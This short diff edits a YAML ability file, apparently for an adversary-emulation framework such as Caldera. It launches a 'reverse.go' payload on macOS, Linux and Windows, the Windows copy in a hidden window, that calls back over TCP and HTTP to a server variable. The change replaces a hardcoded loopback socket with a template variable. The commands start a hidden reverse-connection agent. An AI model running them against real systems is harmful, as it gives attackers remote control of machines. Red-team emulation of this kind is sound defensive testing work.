@@ -11,18 +11,18 @@
     darwin:
       sh:
         command: |
-          nohup ./reverse.go -tcp 127.0.0.1:5678 -http #{server} && sleep 3 >/dev/null 2>&1 &
+          nohup ./reverse.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
         payload: reverse.go
     linux:
       sh:
         command: |
-          nohup ./reverse.go -tcp 127.0.0.1:5678 -http #{server} && sleep 3 >/dev/null 2>&1 &
+          nohup ./reverse.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
         payload: reverse.go
     windows:
       psh:
         command: |
           mv reverse.go reverse.go.exe;
-          Start-Process -FilePath .\reverse.go.exe -ArgumentList "-tcp 127.0.0.1:5678 -http #{server}" -WindowStyle hidden;
+          Start-Process -FilePath .\reverse.go.exe -ArgumentList "-tcp #{tcp_socket} -http #{server}" -WindowStyle hidden;
         cleanup: |
           rm reverse.go;
           rm reverse.go.exe;
